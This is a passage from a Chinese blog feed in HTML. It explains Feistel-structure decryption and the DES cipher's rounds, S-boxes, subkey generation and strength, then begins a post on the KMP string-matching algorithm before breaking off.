F(RE_{i-1},K_i),</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span></span></span></span></span></p><p>又由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>L</mi><msub><mi>E</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">RE_{i-1}=LE_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><msub><mi>E</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>R</mi><msub><mi>E</mi><mi>i</mi></msub><mo>⊕</mo><mi>F</mi><mo stretchy="false">(</mo><mi>L</mi><msub><mi>E</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">LE_{i-1}=RE_i\oplus F(LE_i,K_i).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>又显然有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><msub><mi>E</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>L</mi><msub><mi>E</mi><mi>i</mi></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">RE_{i-1}=LE_i,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p>也就是说，我们获得了密文后，便可以一层层代入解密。至于在加密过程中为什么要增加一步互换位置，是因为互换以后我们得到的密文中的右半部分</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><msub><mi>D</mi><mn>0</mn></msub><mo>=</mo><mi>R</mi><msub><mi>E</mi><mn>17</mn></msub><mo>=</mo><mi>L</mi><msub><mi>E</mi><mn>16</mn></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">RD_0=RE_{17}=LE_{16},</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></span></p><p>这样，我们在解密过程中可以保持对右半部分使用轮函数，<strong>保证了加密解密算法的一致</strong>。</p><p>  值得注意的是，上述论证过程中我们<strong>并没有假设轮函数具有什么性质</strong>，因为事实上，轮函数是可以任意选取的，<strong>这不影响我们的解密过程</strong>。我们后面要讲述的DES，实际上是Feistel结构的一个具体实现。</p><h1 id="des加密算法"><a class="markdownIt-Anchor" href="#des加密算法"></a> DES加密算法</h1><p>  DES加密算法以64位为分组，密钥长度为56位 <em>（实际上，使用的密钥为64位，但是其中8位是校验位，不参与实际运算，因此说是56位）</em>。加密的粗糙流程可见下图。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nSCpx.md.jpg" alt="DES加密流程" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">DES加密流程</span></div></div><p>  我们获取到明文输入后，首先对其进行初始置换(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>)，然后经过16轮迭代，最后经过左右互换（这点在Feistel结构中提到过），然后通过逆初始置换(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">IP^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>)，得到密文输出。<strong>初始置换和逆初始置换是一对互逆运算</strong>。笔者认为其存在的意义仅仅是<strong>增加解密复杂度</strong>。每一轮加密的密钥来源于64位初始密钥生成的子密钥。以下我们解释一下DES的详细加密过程。</p><h2 id="初始置换"><a class="markdownIt-Anchor" href="#初始置换"></a> 初始置换</h2><p>  初始置换和逆初始置换只在最开始和结束使用，其原理是<strong>地址置换</strong>，即将对应位置所指的地址的数据置换到该位上。下面给出了具体的初始置换和逆初始置换表。这里不多赘述。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/05/n82UN.md.png" alt="初始置换" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">初始置换</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/05/n86vC.md.png" alt="逆初始置换" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">逆初始置换</span></div></div><h2 id="轮函数的细节"><a class="markdownIt-Anchor" href="#轮函数的细节"></a> 轮函数的细节</h2><p>  我们先给出轮函数的示意图，然后再解释。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nSu6X.md.jpg" alt="轮函数的细节" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">轮函数的细节</span></div></div><p>  如同我们在Feistel结构中提到的，我们对64位明文信息分组称为左右两部分。由图上可知，轮函数外的步骤和Feistel结构完全一致，我们不多赘述。关键来看一下轮函数中的最重要的四步：<strong>E扩展置换</strong>，<strong>子密钥运算</strong>，<strong>S盒压缩</strong>和<strong>P置换</strong>。</p><h3 id="e扩展置换"><a class="markdownIt-Anchor" href="#e扩展置换"></a> E扩展置换</h3><p>  由于参加运算的子密钥是48位的，然而分组后我们的明文信息只有32位，因此，需要对明文信息扩展称为48位。E扩展是有对应表格的，<strong>它接受32位的输入，产生48位的输出</strong>。具体的扩展方式可以见下面的表格和例子。<strong>这样的扩展会产生16个重复的位</strong>。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/05/n899S.png" alt="Ebox" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">Ebox</span></div></div><h3 id="子密钥运算"><a class="markdownIt-Anchor" href="#子密钥运算"></a> 子密钥运算</h3><p>  将扩展置换结果与子密钥进行异或运算。</p><h3 id="s盒压缩"><a class="markdownIt-Anchor" href="#s盒压缩"></a> S盒压缩</h3><p>  上述的运算结果是48位的，然而，轮函数迭代后的位数是不能够增多的。因此，我们需要对48位的数据压缩，<strong>将之长度还原到32位</strong>。S盒压缩就是在完成这一步。**S盒压缩接受48位的输入，产生32位的输出。**其原理如下图。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nSjSN.webp" alt="S盒压缩过程" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">S盒压缩过程</span></div></div><p>  S盒首先将输入分成6位一组，共计8组。我们不妨假设输入是011001。首先我们获取输入的首尾两位，将其作为行号；剩余的四位作为列号。在上面的例子中，行号是1（01）；列号是12（1100）。我们查询S盒置换表，知道这一位数字是9，即1001。于是，1001就是我们的输出。对于其他7组也是如此，最后一共输出8组4位，共32位的结果。值得注意的是，<strong>S盒不止一个</strong>。其设计标准是不公开的，但S盒是公开的。</p><h3 id="p置换"><a class="markdownIt-Anchor" href="#p置换"></a> P置换</h3><p>  也是一种简单的置换，具有置换对照表。</p><h3 id="子密钥的生成"><a class="markdownIt-Anchor" href="#子密钥的生成"></a> 子密钥的生成</h3><p>  我们输入的是64位的密钥。于是我们通过PC-1置换，将密钥的校验位去除，同时<strong>打乱密钥的顺序</strong>，得到56位的密钥。对这个56位密钥我们再次进行分组，分为左右两半部分各28位长度的密钥。我们把这个密钥称为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub><msub><mi>D</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0D_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。我们对其两部分分别进行左移，左移位数查表可见。对于每一次的左移结果，我们通过PC-2置换得到该次加密的子密钥。重复上述操作，我们可以得到所有加密过程需要的子密钥。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/nS3kt.md.jpg" alt="子密钥生成使用的PC-1、PC-2置换" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">子密钥生成使用的PC-1、PC-2置换</span></div></div><h1 id="des密码的强度"><a class="markdownIt-Anchor" href="#des密码的强度"></a> DES密码的强度</h1><p>  对于P置换和S盒压缩是有要求的，就是<strong>要尽可能增加其中某一位对其他所有位变化的敏感度</strong>，也就是说，<strong>增加算法的扩散程度</strong>，来弥补分组算法本身难以逃脱统计攻击的特点。因此，不论是置换表格的设计，又或是子密钥的生成，都要严格遵循一个效应，我们称之为<strong>雪崩效应</strong>。雪崩效应说的是，明文或密钥的微小改变将对密文产生很大的影响，换句话说，<strong>明文和密钥的任何一位的改变会导致密文很多位的改变</strong>。这样，分析者搜索密钥的难度大大上升，加密算法也更加健壮。</p><p>  但，DES密码并不是牢不可破的。其安全性一直备受质疑。曾在1998年，有一台专门针对DES加密算法的计算机成功破译了DES加密算法。但实际上，这种破译往往需要我们知道待破译的目标语言特点，例如语言特征，文件格式等等。因此，在不知道这些信息的情况下，破译DES依然是有难度的。不论如何，我们如今也有许多DES的替代加密方案例如AES和3DES。对这些方案，我们后续也会加以讨论。</p><p>  不论如何，Feistel结构和DES加密算法仍旧是对称加密算法中的经典，理解它们对我们后续的深入学习是有百利而无一害的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DES加密算法是目前使用最广泛的对称加密算法。它体现了对称加密算法中最经典的Feistel结构。尽管DES加密算法注定要为新的加密标准让出位置，但依旧是我们深入理解对称加密的最好的例子。&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/"/>
    
    <category term="密码学" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码学" scheme="https://blog.snowflake.zone/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>KMP算法</title>
    <link href="https://blog.snowflake.zone/posts/2/"/>
    <id>https://blog.snowflake.zone/posts/2/</id>
    <published>2022-05-18T02:52:47.000Z</published>
    <updated>2022-05-18T02:52:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h1><p>  给定一个字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>，要求从字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>中查找另一个字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>是否出现。如果出现，返回查找的字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>中的位置，否则返回-1。</p><h1 id="最简单的解决方法枚举法"><a class="markdownIt-Anchor" href="#最简单的解决方法枚举法"></a> 最简单的解决方法——枚举法</h1><p>  <strong>枚举法</strong>当然可以解决这个问题：我们可以在从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>字符串中取第一位，然后逐位往后与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>串比较。如果匹配则返回答案；若不匹配，则从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>字符串的第二位开始，重复上述操作，直到找到字符串位置或者字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>被遍历完毕。</p><p>  我们来分析一下这个的算法复杂度。我们假设字符串<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>的长度分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，那么这个算法的最差情况需要比较<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m\times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>次，即这个算法是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo>×</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m\times n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" 